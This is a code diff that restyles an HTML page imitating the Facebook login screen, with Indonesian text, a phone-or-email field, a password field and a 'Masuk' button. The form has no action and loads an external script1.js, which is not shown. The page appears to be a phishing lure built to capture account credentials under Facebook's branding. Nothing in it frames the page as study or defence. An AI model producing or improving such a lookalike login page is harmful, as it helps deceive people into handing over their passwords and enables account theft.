@@ -24,8 +24,11 @@
         }
 
         .fb-logo {
-            width: 240px;
-            margin-bottom: 20px;
+            color: #1877f2;
+            font-size: 4rem;
+            margin: 0 0 20px 0;
+            letter-spacing: -2px;
+            font-weight: bold;
         }
 
         .login-container {
@@ -38,7 +41,7 @@
             box-sizing: border-box;
         }
 
-        .login-container input {
+        .input-field {
             width: 100%;
             padding: 14px;
             margin: 6px 0;
@@ -49,7 +52,7 @@
             outline: none;
         }
 
-        .login-container input:focus {
+        .input-field:focus {
             border-color: #1877f2;
             box-shadow: 0 0 0 2px #e7f3ff;
         }
@@ -79,10 +82,6 @@
             font-size: 14px;
         }
 
-        .forgot-password:hover {
-            text-decoration: underline;
-        }
-
         .divider {
             border-bottom: 1px solid #dadde1;
             margin: 20px 0;
@@ -105,37 +104,32 @@
             background-color: #36a420;
         }
 
-        /* Responsive */
-        @media (max-width: 450px) {
-            .main-wrapper {
-                padding: 20px;
-            }
+        .footer-text {
+            margin-top: 25px;
+            font-size: 14px;
         }
     </style>
 </head>
 <body>
 
     <div class="main-wrapper">
-        <h1 style="color: #1877f2; font-size: 4rem; margin: 0 0 10px 0; letter-spacing: -2px;">facebook</h1>
+        <h1 class="fb-logo">facebook</h1>
 
         <div class="login-container">
-           <form id="Formulir">
-   <input for="email" type="text" class="input-field" id="email" placeholder="Nomor telepon, nama pengguna, atau email" type="text" required><br>
-   <input for="password" type="text" class="input-field" id="password" placeholder="Kata Sandi" type="password" required><br>
-   <button class="btn-login" type="submit">
-    Masuk
-   </button>
-    </form>
+            <form id="Formulir">
+                <input type="text" class="input-field" id="email" placeholder="Nomor telepon atau email" required>
+                <input type="password" class="input-field" id="password" placeholder="Kata Sandi" required>
+                <button class="btn-login" type="submit" id="submitBtn">Masuk</button>
+            </form>
 
             <a href="#" class="forgot-password">Lupa Kata Sandi?</a>
-
             <div class="divider"></div>
-
             <button class="btn-create">Buat Akun Baru</button>
         </div>
 
-        <p style="margin-top: 25px; font-size: 14px;"><b>Buat Halaman</b> untuk selebriti, merek, atau bisnis.</p>
+        <p class="footer-text"><b>Buat Halaman</b> untuk selebriti, merek, atau bisnis.</p>
     </div>
-<script src="script1.js"></script>
+
+    <script src="script1.js"></script>
 </body>
 </html>
